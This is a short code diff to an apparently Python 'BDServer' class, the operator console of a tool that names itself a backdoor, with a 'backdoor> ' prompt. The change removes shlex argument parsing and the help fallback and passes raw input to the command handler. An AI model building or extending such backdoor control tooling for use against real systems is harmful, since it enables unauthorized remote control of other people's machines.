@@ -6,7 +6,6 @@
 import os
 import sys
 import socket
-import shlex
 from BDFramework import BDFramework
 from BDProtocol import BDProtocol
 
@@ -83,24 +82,10 @@ class BDServer:
 				cmdline = input("backdoor> ")
 				args = []
 
-				if not cmdline:
-					continue
+				print("SERVER: Running cmdline: '{}'...".format(cmdline))
 
-				try:
-					# Interpret cmdline into arguments array
-					args = shlex.split(cmdline)
-				
-				except Exception as exc:
-					# Failed interpreting
-					print("Shell lexer[Syntax error]: {}".format(cmdline))
-					continue
-				
 				# Run the command
-				result = handler.runCMD(args)
-
-				# Show help page if needed
-				if result == "INVALID_ARGUMENT":
-					result = handler.runCMD(["help", args[0]])
+				result = handler.runCMD(cmdline)
 
 				if self.verbose:
 					print(result)
